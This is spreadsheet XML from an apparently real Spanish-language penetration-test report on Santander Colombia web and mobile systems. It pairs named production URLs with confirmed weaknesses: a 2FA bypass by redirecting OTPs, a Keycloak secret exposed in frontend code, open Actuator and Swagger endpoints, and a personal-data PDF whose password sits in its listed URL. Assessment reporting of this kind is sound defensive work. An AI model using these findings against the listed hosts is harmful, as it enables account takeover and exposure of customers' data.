(SSL/TLS)</t>
  </si>
  <si>
    <t>Evasión de Detección de Root</t>
  </si>
  <si>
    <t xml:space="preserve">Soporte para Versiones de Android Desactualizadas </t>
  </si>
  <si>
    <t>Detectado tipo y versión del servidor de la aplicación</t>
  </si>
  <si>
    <t>APP Santander Token (Android)</t>
  </si>
  <si>
    <t>La aplicación móvil incorpora un mecanismo de fijación de certificados para asegurar las comunicaciones de red, sin embargo, dicha implementación resulta insuficiente dado que podría ser evadida durante la ejecución. Al intentar interceptar el tráfico mediante una configuración de proxy estándar, la aplicación identifica correctamente la anomalía, interrumpiendo la conexión y generando una alerta de tipo certificate_unknown. A pesar de ello, 
empleando entornos de instrumentación dinámica, como Frida, la lógica de validación del lado del cliente podría ser alterada en memoria, evadiendo la protección.</t>
  </si>
  <si>
    <t>Un usuario malintencionado que cuente con acceso físico al dispositivo o capacidad para 
ejecutar código no autorizado en el mismo podría interceptar, leer y manipular todo el 
tráfico HTTPS entre la aplicación y los servidores de la entidad. Este escenario podría 
desencadenar el compromiso total de tokens de sesión, datos financieros e información 
personal sensible perteneciente al usuario legítimo.</t>
  </si>
  <si>
    <t>Integrar controles robustos de ofuscación y mecanismos contra la manipulación para 
asegurar la fijación de certificados frente a alteraciones en memoria. Se aconseja desplegar 
mecanismos de Autoprotección de Aplicaciones en Tiempo de Ejecución (RASP) capaces de 
detectar y bloquear herramientas de instrumentación dinámica.</t>
  </si>
  <si>
    <t>La aplicación móvil implementa mecanismos de seguridad en el lado del cliente para detectar si se está ejecutando en un dispositivo "rooteado" o comprometido. Sin embargo, estosmecanismos resultan insuficientes o carentes de la ofuscación adecuada, lo que permitiría evadirlos utilizando herramientas de instrumentación dinámica. La aplicación comprueba específicamente indicadores comunes de root, como binarios su, Magisk, SuperSU y ciertas banderas de compilación. Un usuario malintencionado podría capturar (hook) estas funciones específicas (tales como File.exists(), Runtime.exec(), SystemProperties y PackageManager) en tiempo de ejecución para devolver falsos negativos, engañando a la aplicación para que asuma que el entorno es completamente seguro.</t>
  </si>
  <si>
    <t>Al evadir estas protecciones, un usuario malintencionado podría ejecutar la aplicación en un 
entorno completamente controlado. Esto le facilitaría monitorizar la lógica interna del 
software, extraer datos sensibles almacenados en memoria o almacenamiento local, y 
manipular el comportamiento general. Como consecuencia, un usuario legítimo podría 
exporner sus datos si su dispositivo fuera interceptado y las protecciones de la app fuesen 
evadidas.</t>
  </si>
  <si>
    <t>Implementar comprobaciones del entorno de múltiples capas y fuertemente ofuscadas. En 
lugar de depender únicamente de comprobaciones estándar de la API a nivel de Java, se 
recomienda incorporar validaciones nativas en C/C++, realizar comprobaciones de 
integridad del espacio de memoria de la aplicación y utilizar mecanismos respaldados por 
hardware, como la API de Google Play Integrity.</t>
  </si>
  <si>
    <t>La aplicación móvil está configurada con una versión mínima de SDK (minSdkVersion) 
desactualizada. Los sistemas operativos Android por debajo de la versión mínima recomendada ya no reciben parches de seguridad oficiales. Al permitir la instalación en estos sistemas obsoletos, la aplicación queda expuesta a vulnerabilidades subyacentes del propio sistemaoperativo. Las características de seguridad modernas introducidas en versiones más recientes de Android, como protecciones de memoria mejoradas y restricciones estrictas sobre rocesos en segundo plano, podrían no estar disponibles en los dispositivos afectados.</t>
  </si>
  <si>
    <t>Las vulnerabilidades conocidas y públicamente divulgadas presentes en el sistema operativo 
desactualizado podrían ser aprovechadas para comprometer el entorno de la aplicación. 
Esto podría derivar en acceso no autorizado a los datos sensibles almacenados localmente. 
Además, los dispositivos que ejecutan software sin parchear son más susceptibles a la 
presencia de malware, que podría monitorizar o manipular el comportamiento de la aplicación.</t>
  </si>
  <si>
    <t>Se recomienda actualizar la configuración de la aplicación para requerir una versión mínima 
de SDK más reciente. Se aconseja establecer el valor de minSdkVersion en al menos 28 
(Android 9) o superior, garantizando que la aplicación solo pueda ejecutarse en dispositivos 
que aún reciben actualizaciones de seguridad periódicas y se benefician de la arquitectura de 
seguridad moderna de Android.</t>
  </si>
  <si>
    <t>La aplicación expone de manera visible la tecnología subyacente y la versión exacta de su servidor web. Cuando se procesa una petición con un método HTTP no soportado por elentorno, como por ejemplo DEBUG, el sistema desencadena un error devolviendo un código de estado 501 Not Implemented. La plantilla de error devuelta por defecto incorpora la huella digital del software, evidenciando claramente la ejecución de Apache Tomcat/8.5.13.</t>
  </si>
  <si>
    <t>Un usuario malintencionado podría utilizar esta información sobre el tipo y la versión del 
servidor para buscar exploits públicos conocidos o vulnerabilidades asociadas con dicha 
versión específica. Esto reduce significativamente el esfuerzo necesario para perfilar el sistema, 
lo que podría derivar en un compromiso de la infraestructura, afectando la seguridad del 
entorno para el usuario legítimo.</t>
  </si>
  <si>
    <t>Configurar el servidor web para omitir la información de la versión y el tipo de tecnología en 
las páginas de error y en las cabeceras HTTP. En el caso de Apache Tomcat, esto implica 
modificar el atributo serverInfo en el archivo ServerInfo.properties ubicado dentro de catalina.jar, o implementar un ErrorReportValve personalizado para reemplazar las páginas 
de error por defecto por pantallas completamente genéricas.</t>
  </si>
  <si>
    <t xml:space="preserve">SC-26-CNMPO-009-AP-003 </t>
  </si>
  <si>
    <t>SC-26-CNMPO-009-AP-004</t>
  </si>
  <si>
    <t>SC-26-CNMPO-009-CO-005</t>
  </si>
  <si>
    <t xml:space="preserve">Protección de fichero deficiente </t>
  </si>
  <si>
    <t>Exposición de Documentación de API</t>
  </si>
  <si>
    <t>Exposición de información a través del endpoint /info de Spring Boot Actuator</t>
  </si>
  <si>
    <t>https://44539823.fs1.hubspotusercontent_x0002_na1.net/hubfs/44539823/extractos/1077034607/830000030959-2026-04-7564805910.pdf</t>
  </si>
  <si>
    <t>La vulnerabilidad se produce cuando un fichero PDF que contiene datos personales es protegido 
mediante un mecanismo de seguridad débil e inadecuado. En este caso, el documento está 
protegido con una contraseña de únicamente cuatro dígitos, lo que supone un espacio de búsqueda 
extremadamente reducido y fácilmente explotable mediante ataques automatizados.
Adicionalmente, la contraseña de protección se encuentra expuesta de forma indirecta en la propia 
URL de descarga del fichero, ya que forma parte de la misma. Esto implica que cualquier usuario con 
acceso a la URL puede obtener la clave sin necesidad de realizar ningún tipo de ataque, anulando 
completamente la eficacia del mecanismo de protección implementado.
Esta combinación de debilidades convierte la protección del fichero en meramente simbólica, 
permitiendo el acceso no autorizado a información sensible contenida en el documento.</t>
  </si>
  <si>
    <t>El riesgo asociado es alto, ya que la vulnerabilidad afecta directamente a la confidencialidad de datos 
personales. La exposición de la contraseña en la URL elimina cualquier barrera de protección, 
permitiendo el acceso inmediato al contenido del fichero por parte de terceros no autorizados.
Incluso en ausencia de dicha exposición, el uso de una contraseña de cuatro dígitos hace que el 
fichero sea vulnerable a ataques de fuerza bruta que pueden ser ejecutados en muy poco tiempo 
con herramientas automatizadas, debido al reducido número de combinaciones posibles.
La explotación de esta vulnerabilidad podría derivar en la divulgación de información sensible, 
incumplimientos normativos en materia de protección de datos y posibles impactos legales y 
reputacionales para la organización.</t>
  </si>
  <si>
    <t>Se recomienda eliminar el uso de contraseñas débiles como único mecanismo de protección para 
ficheros que contienen información sensible. En su lugar, se deben implementar controles de 
acceso robustos a nivel de aplicación, asegurando que únicamente usuarios autenticados y 
autorizados puedan acceder a los documentos
Asimismo, nunca se debe incluir información sensible, como contraseñas o tokens de acceso, 
dentro de la URL. En su lugar, se deben utilizar mecanismos seguros de gestión de sesiones o 
enlaces temporales firmados con expiración.
En caso de requerir protección adicional del fichero, se deben emplear contraseñas robustas con 
suficiente entropía o mecanismos de cifrado fuerte, aunque siempre como complemento a 
controles de acceso adecuados.</t>
  </si>
  <si>
    <t>Se ha identificado una vulnerabilidad de divulgación de información, que consiste en la exposición 
pública de la documentación de la Interfaz de Programación de Aplicaciones (API) mediante el 
esquema OpenAPI/Swagger. Esta documentación, accesible sin necesidad de autenticación, revela 
de manera exhaustiva la estructura interna de la API, listando todos los endpoints disponibles, los 
parámetros obligatorios y opcionales que aceptan, así como el formato de los datos que esperan y 
devuelven. Como prueba de concepto, se demostró que cualquier atacante puede mapear por 
completo la superficie de ataque de la API, sin necesidad de interactuar previamente con la 
aplicación, lo que facilita enormemente la planificación de ataques subsecuentes y la búsqueda de 
lógica de negocio defectuosa.</t>
  </si>
  <si>
    <t>Un atacante puede usar la documentación de la API expuesta para identificar rápidamente todos los 
endpoints disponibles, los parámetros aceptados, los modelos de datos y las operaciones posibles, 
reduciendo significativamente el tiempo necesario para la fase de reconocimiento. Esta información 
facilita la identificación de endpoints vulnerables y la construcción de payloads de ataque precisos</t>
  </si>
  <si>
    <t>Se debe proteger el acceso a la documentación de la API mediante autenticación, limitando el 
acceso a los equipos de desarrollo y a usuarios autorizados. En entornos de producción se debe 
considerar deshabilitar completamente la documentación interactiva (Swagger UI). Se debe revisar 
que la documentación no incluya ejemplos con credenciales reales o tokens de acceso</t>
  </si>
  <si>
    <t>Spring Boot Actuator expone una serie de endpoints de gestión y monitorización, entre ellos 
/actuator/info, que puede revelar información sensible sobre la aplicación si no está correctamente 
restringido. Este endpoint puede devolver datos como la versión de la aplicación, metadatos de 
compilación, información del repositorio Git (rama, commit hash, autor), propiedades 
personalizadas inyectadas desde application.properties o variables de entorno, y detalles sobre el 
entorno de ejecución.</t>
  </si>
  <si>
    <t>http://servicios.santander.com.co/custome
r/v1/actuator
http://servicios.santander.com.co/account/
v1/actuator</t>
  </si>
  <si>
    <t>La información expuesta a través de /actuator/info puede ser aprovechada por un atacante en fases 
de reconocimiento para construir un perfil detallado de la aplicación objetivo. Conocer la versión 
exacta del framework, dependencias o el hash de commit permite identificar versiones vulnerables, 
buscar CVEs aplicables y planificar ataques dirigidos con mayor precisión. Si el endpoint expone 
propiedades de configuración personalizadas —como URLs de servicios internos, nombres de 
entornos, identificadores de infraestructura o flags de funcionalidades—, el atacante puede obtener 
información suficiente para pivotar hacia otros sistemas internos o ajustar sus técnicas de 
explotación al entorno real de producción.</t>
  </si>
  <si>
    <t>Se recomienda restringir el acceso a todos los endpoints de Spring Boot Actuator mediante Spring 
Security, permitiendo únicamente el acceso a usuarios autenticados y autorizados con roles 
específicos (por ejemplo, ROLE_ADMIN), configurando adecuadamente 
management.endpoints.web.exposure.include para exponer únicamente los endpoints 
estrictamente necesarios y nunca exponiendo /actuator/info de forma pública en entornos de 
producción.</t>
  </si>
  <si>
    <t>SC-26-CNMPO-002-AP-001</t>
  </si>
  <si>
    <t>SC-26-CNMPO-002-AP-002</t>
  </si>
  <si>
    <t>SC-26-CNMPO-002-AP-003</t>
  </si>
  <si>
    <t>La aplicación expone información sensible como credenciales, datos personales, información financiera o datos de negocio confidenciales a través de respuestas HTTP, endpoints accesibles,ficheros accesibles públicamente o mensajes de error.</t>
  </si>
  <si>
    <t>Un atacante puede acceder a la información sensible expuesta y usarla para comprometer cuentas 
de usuario, realizar fraude, incumplir la normativa de protección de datos o realizar ataques más 
sofisticados usando la información obtenida. El impacto depende de la naturaleza y sensibilidad de 
la información expuesta.</t>
  </si>
  <si>
    <t>Se debe identificar y clasificar toda la información sensible de la aplicación e implementar controles 
de acceso adecuados para cada categoría. Se deben eliminar o proteger adecuadamente todos los 
canales por los que se expone información sensible. Se debe implementar cifrado en reposo y en 
tránsito para todos los datos sensibles.</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/clientes_tesla</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/credito-vehiculo-prepago</t>
  </si>
  <si>
    <t>La aplicación no implementa medidas de protección contra ataques de clickjacking, permitiendo que sus páginas sean incrustadas en iframes de sitios web maliciosos. Un atacante puede engañar a los usuarios para que realicen acciones no deseadas en la aplicación al hacer click en elementos invisibles superpuestos.</t>
  </si>
  <si>
    <t>Se debe implementar la cabecera X-Frame-Options con el valor DENY para impedir que la aplicación 
sea cargada en cualquier iframe. Si se requiere cargar en el mismo dominio, se puede usar 
SAMEORIGIN. Complementariamente, se debe configurar la directiva frame-ancestors en la 
Content-Security-Policy para un control más preciso compatible con navegadores modernos.</t>
  </si>
  <si>
    <t>Mediante clickjacking un atacante puede manipular a usuarios autenticados para que ejecuten 
acciones involuntarias en la aplicación aprovechando que la página se carga dentro de un iframe
invisible en un sitio bajo control del atacante. Las acciones que puede desencadenar dependen de la funcionalidad de la aplicación y pueden incluir cambios de configuración, autorización de 
transacciones o cambio de credenciales</t>
  </si>
  <si>
    <t>SC-26-CNMPO-002-AP-004</t>
  </si>
  <si>
    <t>SC-26-CNMPO-002-AP-005</t>
  </si>
  <si>
    <t>Ausencia de la cabecera HTTP X-Content-Type-Options</t>
  </si>
  <si>
    <t>La aplicación no incluye la cabecera HTTP X-Content-Type-Options: nosniff en sus respuestas, permitiendo que los navegadores intenten adivinar el tipo de contenido de las respuestas (MIME sniffing) en lugar de respetar el Content-Type declarado. Esto puede derivar en la ejecución no intencional de contenido como scripts.</t>
  </si>
  <si>
    <t>Un atacante puede explotar el MIME sniffing del navegador para hacer que contenido que debería 
ser tratado como texto plano o imagen sea interpretado como HTML o JavaScript ejecutable. Esto puede combinarse con la subida de ficheros o la inyección de contenido para ejecutar XSS en 
contextos donde normalmente no sería posible.</t>
  </si>
  <si>
    <t>Se debe incluir la cabecera X-Content-Type-Options: nosniff en todas las respuestas de la 
aplicación. Esta cabecera instruye al navegador para que respete estrictamente el Content-Type 
declarado sin intentar inferir el tipo de contenido, previniendo los ataques basados en MIME 
sniffing</t>
  </si>
  <si>
    <t>SC-26-CNMPO-022-CO-001</t>
  </si>
  <si>
    <t>Exposición de credenciales OAuth de Keycloak en el frontend</t>
  </si>
  <si>
    <t>La aplicación expone credenciales sensibles de autenticación OAuth correspondientes a un cliente de Keycloak (client_id y client_secret) directamente desde el frontend de la aplicación. Estas credenciales son utilizadas para realizar peticiones de autenticación contra el proveedor de identidad y pueden ser obtenidas fácilmente por cualquier usuario mediante la inspección del código 
JavaScript, tráfico HTTP o herramientas de desarrollo del navegador.
El uso de un client_secret en aplicaciones frontend constituye una mala práctica de seguridad, ya que las aplicaciones ejecutadas del lado cliente no pueden garantizar la confidencialidad de secretos criptográficos. La exposición de este tipo de credenciales rompe el modelo de seguridad de OAuth 2.0 y OpenID Connect, donde los clientes públicos no deben almacenar secretos confidenciales.</t>
  </si>
  <si>
    <t>Un atacante externo puede extraer el client_secret del bundle JavaScript de la aplicación y usarlo 
para obtener tokens Bearer válidos contra el endpoint /login_client, sin necesidad de ningún tipo 
de credencial de usuario. Esto fue confirmado durante las pruebas, accediendo a endpoints de 
producción con HTTP 200. Además, dado el scope offline_access presente en los tokens emitidos, 
es posible mantener ese acceso de forma indefinida rotando el refresh token, lo que significa que 
con una sola extracción de las credenciales el acceso no expira.
Adicionalmente, si el atacante dispone de acceso a la red interna, estas mismas credenciales 
podrían ser suficientes para acceder a Keycloak y desde ahí gestionar usuarios, impersonar cuentas 
o modificar roles dentro del sistema de la identidad del banco.</t>
  </si>
  <si>
    <t>Eliminar el client_secret del código frontend de forma inmediata y regenerarlo en Keycloak, 
revocando todos los tokens activos del cliente. Para evitar que el problema se repita, lo correcto es 
migrar a Authorization Code Flow + PKCE (RFC 7636), diseñado precisamente para aplicaciones 
frontend donde no es posible proteger un secreto. Idealmente, mover la autenticación al backend 
mediante el patrón BFF para que el navegador nunca maneje credenciales OAuth directamente. 
Adicionalmente, eliminar el rol offline_access del cliente público, activar "Revoke Refresh Token" en 
Keycloak para que cada uso del refresh token lo invalide, y revisar los logs del endpoint /login_client 
para detectar si ha habido usos indebidos previos a este hallazgo.</t>
  </si>
  <si>
    <t>SC-26-CNMPO-022-CO-002</t>
  </si>
  <si>
    <t>SC-26-CNMPO-022-CO-003</t>
  </si>
  <si>
    <t>SC-26-CNMPO-022-CO-004</t>
  </si>
  <si>
    <t>SC-26-CNMPO-022-CO-005</t>
  </si>
  <si>
    <t>Bypass del segundo factor de autenticación por manipulación del parámetro de envío del OTP</t>
  </si>
  <si>
    <t>Ausencia de limitación de frecuencia en generación de códigos OTP</t>
  </si>
  <si>
    <t>https://aliados.santanderconsumer.co/</t>
  </si>
  <si>
    <t>El sistema utiliza un segundo factor de autenticación (2FA) mediante el envío de un código OTP al correo o teléfono del usuario. Sin embargo, el endpoint encargado del envío permite especificar el destinatario sin validar que pertenezca al usuario autenticado. Esto permite a un atacante modificar dicho parámetro y recibir el OTP en una dirección controlada, evadiendo así la verificación 2FA y accediendo a operaciones privilegiadas sin autorización.</t>
  </si>
  <si>
    <t xml:space="preserve">La falta de validación en el parámetro que define el destinatario del código OTP permite a un 
atacante manipular la solicitud y recibir el segundo factor de autenticación en una dirección de 
correo no autorizada. Esto posibilita el acceso no legítimo a cuentas o funcionalidades críticas, 
comprometiendo la seguridad del proceso de autenticación multifactor. </t>
  </si>
  <si>
    <t>El sistema debe validar internamente el canal y destino del 2FA, evitando que el cliente los 
especifique en la petición. El OTP solo debe enviarse a direcciones o números previamente 
asociados y verificados del usuario autenticado. Asimismo, se recomienda registrar los intentos de 
cambio de canal, aplicar controles de tasa (rate limiting) y generar alertas ante comportamientos 
anómalos.</t>
  </si>
  <si>
    <t>Durante el análisis de la aplicación web se identificó la exposición de credenciales y valores sensibles incluidos dentro de archivos JavaScript públicos distribuidos por la aplicación. El código analizado contenía información codificada en Base64 y mecanismos de ofuscación reversible implementados del lado cliente. Asimismo, se comprobó que parte de la información sensible podía recuperarse fácilmente mediante procesos de decodificación, debido a que la lógica necesaria para revertir la 
protección también se encontraba incluida dentro del propio código JavaScript.</t>
  </si>
  <si>
    <t>Un atacante no autenticado podría extraer las credenciales incluidas en el código JavaScript y 
utilizarlas para intentar autenticarse contra servicios internos o integraciones externas asociadas 
a la aplicación. La exposición de secretos OAuth y credenciales de ambientes productivos puede 
facilitar accesos no autorizados, suplantación de la aplicación cliente, obtención de tokens válidos 
o abuso de APIs de terceros. Adicionalmente, debido a que la clave de ofuscación también se 
encuentra expuesta, cualquier otro valor sensible protegido mediante el mismo mecanismo podría 
ser recuperado fácilmente. Aunque no se verificó activamente la vigencia de las credenciales 
identificadas, todas ellas deben considerarse comprometidas debido a su exposición pública.</t>
  </si>
  <si>
    <t>Se recomienda eliminar inmediatamente cualquier credencial, token o información sensible 
embebida dentro de código frontend distribuido públicamente. Todas las credenciales 
identificadas deben considerarse comprometidas y proceder a su rotación inmediata, 
independientemente de si continúan activas. Para integraciones OAuth se recomienda adoptar 
flujos seguros como Authorization Code + PKCE y evitar el uso de client_secret en aplicaciones 
frontend públicas. Asimismo, se recomienda implementar un Backend For Frontend (BFF) o proxy 
autenticado que custodie las credenciales y valores sensibles del lado servidor y centralice el acceso 
a servicios externos. Finalmente, se recomienda revisar otros bloques JavaScript y artefactos 
publicados por la organización con el objetivo de identificar exposiciones similares y auditar los 
registros de acceso para detectar posibles usos indebidos previos al hallazgo.</t>
  </si>
  <si>
    <t>El endpoint de generación de códigos OTP no implementa mecanismos de limitación de frecuencia ni controles de protección frente a solicitudes automatizadas. Durante las pruebas realizadas se observó que el servicio permite el envío consecutivo e ilimitado de solicitudes de generación de OTP para una misma dirección de correo electrónico, respondiendo satisfactoriamente a cada petición sin aplicar bloqueos temporales, penalizaciones progresivas ni restricciones asociadas al número de 
intentos realizados.
Mediante automatización de peticiones consecutivas se comprobó que el sistema genera y envía un nuevo código OTP por cada solicitud recibida, permitiendo un abuso continuado del mecanismo de autenticación</t>
  </si>
  <si>
    <t>La ausencia de mecanismos de limitación de frecuencia permite que un atacante abuse del sistema 
de generación de OTP mediante automatización de solicitudes.
Esta situación puede derivar en ataques de denegación funcional sobre el flujo de autenticación, 
degradando la experiencia del usuario legítimo mediante el envío masivo de correos electrónicos 
con códigos OTP y dificultando la identificación del código válido vigente. Adicionalmente, debido 
a que los códigos generados son numéricos y de longitud reducida, el envío masivo de OTP 
incrementa la probabilidad de éxito de ataques de fuerza bruta dirigidos al mecanismo de 
validación. El abuso continuado del endpoint también puede generar consumo innecesario de 
recursos y costes operativos asociados a plataformas de mensajería o envío de correo electrónico 
utilizadas por la organización.</t>
  </si>
  <si>
    <t>Se recomienda implementar mecanismos de limitación de frecuencia (rate limiting) sobre el 
endpoint de generación de códigos OTP, aplicando restricciones tanto por dirección IP como por 
identificador de usuario o correo electrónico. Asimismo, se recomienda establecer límites máximos 
de solicitudes permitidas en intervalos temporales definidos, aplicar bloqueos temporales 
progresivos ante comportamientos anómalos e incorporar controles adicionales frente a 
automatización, como mecanismos CAPTCHA o desafíos equivalentes. Adicionalmente, se 
recomienda configurar una caducidad corta para los códigos OTP emitidos e invalidar 
automáticamente códigos anteriores cuando se genere uno nuevo para el mismo usuario.</t>
  </si>
  <si>
    <t>La aplicación transmite información sensible mediante parámetros incluidos en la URL de peticiones HTTP GET. Durante el análisis se identificó el envío de datos asociados al usuario, incluyendo dirección de correo electrónico, número telefónico y documento de identificación, directamente en la cadena de consulta de la URL utilizada por el endpoint de generación de códigos OTP. Aunque parte de la información es presentada de forma enmascarada en la interfaz gráfica de usuario, los valores completos continúan siendo enviados en las solicitudes HTTP realizadas por 
la aplicación</t>
  </si>
  <si>
    <t>Se identifica una solicitud HTTP GET similar a la siguiente:
/used-vehicle/otpservice?email=&amp;cel=&amp;cedula=
La petición incluye información sensible directamente en parámetros de la URL, concretamente la 
dirección de correo electrónico, el número telefónico y el número de identificación personal. Esta 
información se observa en texto claro durante la interceptación de tráfico HTTP mediante 
herramientas de análisis como Burp Suite.
Debido al uso de parámetros en la URL en peticiones GET, estos valores pueden quedar registrados 
en logs del servidor web, sistemas proxy intermedios, herramientas de monitoreo y observabilidad, 
sistemas de trazabilidad HTTP, así como en infraestructura intermedia de red o balanceadores.
Aunque la información no se muestra directamente en la barra de direcciones del navegador 
durante las pruebas realizadas, los datos sensibles continúan siendo transmitidos dentro de la URL 
de la petición HTTP.
El impacto principal de la vulnerabilidad radica en la exposición de información sensible del usuario 
a lo largo de múltiples puntos de la infraestructura, lo que incrementa la superficie de ataque y el 
riesgo de acceso no autorizado a datos personales. Esta condición se presenta de forma remota y 
no requiere autenticación previa, dependiendo únicamente de la capacidad de interceptar o 
acceder a registros de tráfico HTTP donde se almacenen las URLs procesadas</t>
  </si>
  <si>
    <t>Se recomienda evitar el envío de información sensible mediante parámetros URL y utilizar 
peticiones HTTP POST para transmitir dichos datos a través del cuerpo de la solicitud.
Asimismo, se recomienda minimizar la exposición de datos personales en flujos de autenticación y 
utilizar identificadores temporales o referencias indirectas cuando resulte necesario mantener 
contexto entre solicitudes.
Adicionalmente, se recomienda revisar los mecanismos de logging y monitoreo para evitar el 
almacenamiento innecesario de información sensible transmitida por la aplicación</t>
  </si>
  <si>
    <t>SC-26-CNMPO-021-AP-001</t>
  </si>
  <si>
    <t>SC-26-CNMPO-021-AP-002</t>
  </si>
  <si>
    <t>SC-26-CNMPO-021-AP-003</t>
  </si>
  <si>
    <t>SC-26-CNMPO-021-AP-004</t>
  </si>
  <si>
    <t>Subida de ficheros maliciosos</t>
  </si>
  <si>
    <t>Acceso a datos confidenciales en almacenamiento local</t>
  </si>
  <si>
    <t>Uso de Autenticación Básica en aplicativo web</t>
  </si>
  <si>
    <t>Se han identificado que varios apartados de la web utilizan el mismo endpoint para la subida de ficheros que son procesados por el servidor. A continuación, se muestra el ejemplo con la funcionalidad en la pestaña de “Proveedores” aunque este mismo endpoints es utilizada por las distintas pantallas que permiten la subida de ficheros.</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/Comisiones/comisiones/v1/login/user</t>
  </si>
  <si>
    <t>Ciertas aplicaciones permiten la subida de tipos de ficheros que pueden llegar a albergar contenido 
malicioso. Este contenido puede ser recibido directamente por algún empleado de la compañía sin que haya pasado por ciertos controles (análisis de antivirus, ejecución en sandbox…) que existen 
típicamente en otros canales de comunicación, como el correo electrónico.</t>
  </si>
  <si>
    <t>Se recomienda establecer controles que analicen de forma automática los ficheros subidos a los 
portales mencionados, ya sea mediante firmas estáticas o mediante análisis dinámico en un 
entorno tipo “sandbox” así como aplicar un control exhaustivo sobre las extensiones de los ficheros 
subidos por usuarios.
Además como medidas internas, se recomienda categorizar y hacer inventario de los canales 
comunicación externo con el objetivo de estudiar el riesgo de cada uno de ellos.</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/Comisiones</t>
  </si>
  <si>
    <t>El acceso no autorizado a datos confidenciales o sensibles almacenados localmente puede tener un impacto significativo, dependiendo del tipo de información expuesta. Estos datos podrían ser utilizados por un atacante en otras fases del ataque, facilitando el compromiso de sistemas adicionales o la escalada de privilegios. Ejemplos de información sensible incluyen datos de infraestructura, manuales de usuario, mapas de red, credenciales de usuarios, scripts de inicialización de procesos, y acceso a ejecutables.</t>
  </si>
  <si>
    <t>Un atacante puede abusar de otras vulnerabilidades para obtener credenciales en texto plano, tales 
como XSS o simplemente acceso no monitorizado a un equipo con una cuenta autenticada. Con unas 
credenciales en texto plano el atacante podría acceder a la aplicación o bien intentar la reutilización 
de credenciales en otras plataformas.</t>
  </si>
  <si>
    <t>Para mitigar este riesgo: 
• Revisar las autorizaciones de acceso: Asegurar que el acceso a datos sensibles esté 
estrictamente limitado según la estrategia de mínimo privilegio. 
• Monitoreo y auditoría: Implementar controles de monitoreo y auditoría para detectar 
accesos no autorizados a datos confidenciales. 
• Capacitación en seguridad: Educar a los administradores del sistema y a los usuarios sobre 
la importancia de proteger la información sensible y cómo hacerlo de manera efectiva.</t>
  </si>
  <si>
    <t>La aplicación analizada, utiliza un método de autenticación inseguro denominado "Autenticación 
Básica". En este tipo de autenticación, las credenciales de usuario se envían codificadas en base64 al 
servidor, a través de la cabecera HTTP de tipo "Authorization".</t>
  </si>
  <si>
    <t>Un atacante que tuviese acceso a registros (log) de comunicación de red HTTP o a los logs de ciertos 
sistemas intermedios, por ejemplo, proxies y/o servidor de backend, podría acceder a los datos de 
estos registros y decodificar las credenciales transmitidas en texto claro.
Por otro lado, este método de autenticación no es compatible con el uso de medidas de protección 
específicas para evitar ataques de fuerza bruta.</t>
  </si>
  <si>
    <t>De manera general se recomienda no utilizar el método de "Autenticación Básica" en el proceso de 
autenticación de los usuarios.
Utilizar sistemas de autenticación robustos, que autentiquen al usuario mediante identificadores 
generados de manera dinámica por un algoritmo de hash robusto. Además, estos identificadores no 
deben contener las credenciales de los usuarios o partes de estas.</t>
  </si>
  <si>
    <t>Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que 
los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido. Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acordes a la funcionalidad y acciones de la propia 
aplicación.
Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación.</t>
  </si>
  <si>
    <t>La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque 
como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, 
ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento 
y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación.</t>
  </si>
  <si>
    <t>La aplicación debe controlar la lógica de negocio para garantizar que una determinada 
funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se 
alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad.
Dependiendo de la acción afectada se controlará el número de veces que una acción se puede 
utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo</t>
  </si>
  <si>
    <t>Open Secure Sockets Layer (OpenSSL) Security Vulnerabilities (CVE-2026-28388,CVE-2026-28389,CVE-2026-28390) (Unauthenticated Detection)</t>
  </si>
  <si>
    <t>QA-VM-7099683207243716021</t>
  </si>
  <si>
    <t>The OpenSSL software library allows secure communications over computer networks against eavesdropping or need to identify the party at the other end. OpenSSL contains an open-source implementation of the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols.
Affected versions
from 3.6.0 before 3.6.2
from 3.5.0 before 3.5.6
from 3.4.0 before 3.4.5
from 3.3.0 before 3.3.7
from 3.0.0 before 3.0.20
from 1.1.1 before 1.1.1zg
from 1.0.2 before 1.0.2zp 
QID Detection Logic (Unauthenticated):This QID matches vulnerable versions based on the exposed banner information under the OpenSSL service.</t>
  </si>
  <si>
    <t>For more information regarding these vulnerabilities, please refer to  OpenSSL Advisory.
Patch:
Following are links for downloading patches to fix the vulnerabilities:
 CVE-2026-28389 CVE-2026-28388 CVE-2026-28390</t>
  </si>
  <si>
    <t>SC-26-CNMPO-020-CO-001</t>
  </si>
  <si>
    <t>SC-26-CNMPO-020-CO-002</t>
  </si>
  <si>
    <t>Ficheros de configuración expuestos de manera pública</t>
  </si>
  <si>
    <t>SISTEMAS AFECTADOS: 
• https://bpm.santanderconsumer.co/Originac
ionPROD/Api/Authentication/BizagiConfig
• https://bpm.santanderconsumer.co/Originac
ionPROD/jquery/production/11.2.5.1234/des
ktop/js/common.desktop.production.js
• https://bpm.santanderconsumer.co/Originac
ionPROD/jquery/version.json.txt
• https://bpm.santanderconsumer.co/Originac
ionPROD/bizagi.cache.appcache</t>
  </si>
  <si>
    <t>La aplicación no restringe el acceso a ciertos ficheros de configuración internos de la aplicación y/o 
la plataforma siendo accesibles de manera pública. De esta manera, la información sensible que 
pudieran contener estos ficheros quedaría expuesta.</t>
  </si>
  <si>
